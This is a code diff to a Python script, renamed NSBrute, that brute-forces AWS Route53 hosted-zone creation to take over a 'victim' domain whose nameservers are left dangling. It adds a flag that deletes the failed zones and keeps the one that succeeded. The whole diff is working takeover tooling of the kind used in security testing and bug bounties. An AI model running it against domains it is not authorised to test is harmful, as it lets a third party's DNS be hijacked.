@@ -9,6 +9,8 @@ secretKey=""
 victimDomain=""
 targetNS=[]
 nsRecord=0
+successful_zone_id = ""
+forceDelete=False
 
 
 class bcolors:
@@ -56,7 +58,7 @@ def myPrint(text, type):
 if (len(sys.argv)<7):
 	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
 	print ""
-	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
+	myPrint("Usage: python NSBrute.py -d domain -a accessKey -s secretKey","ERROR")
 	myPrint("Please try again!!", "ERROR") 
 	print ""
 	exit(1);
@@ -66,6 +68,8 @@ if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
 	accessKey=sys.argv[4]
 if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
 	secretKey=sys.argv[6]
+if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
+	forceDelete = True
 try:
 	nsRecords = dns.resolver.query(victimDomain, 'NS')
 except:
@@ -104,7 +108,7 @@ while True:
 	try: 
 		new_zone=0
 		new_zone, change_info = conn.create_hosted_zone(
-	    victimDomain, comment='zaheck'
+	    victimDomain, comment='created by NSBrute during testing.'
 		)
 		#Erroneous Condition
 		if new_zone is None:
@@ -118,10 +122,11 @@ while True:
 			print ""
 			new_zone.delete()
 		else:
+			successful_zone_id = new_zone.id
 			myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
 			myPrint("Check your AWS account, the work is done!","SECURE")
 			print ""
-			exit(0)
+			break
 	except Exception as e:
 		myPrint("Exceptional behaviour observed while creating the zone.", "ERROR")
 		myPrint("Trying Again!","ERROR")
@@ -129,4 +134,11 @@ while True:
 			new_zone.delete()
 		continue
 
-
+if forceDelete:
+	if successful_zone_id != "":
+		# we know we have to be very careful here, there was a successful exploit of the vulnerability, and we don't want to reverse that
+		for zone in conn.list_hosted_zones():
+			if zone["comment"] == "created by NSBrute during testing.":
+				if zone["id"] != successful_zone_id:
+					zone_to_delete = conn.get_hosted_zone_by_id(zone["id"])
+					zone_to_delete.delete()	
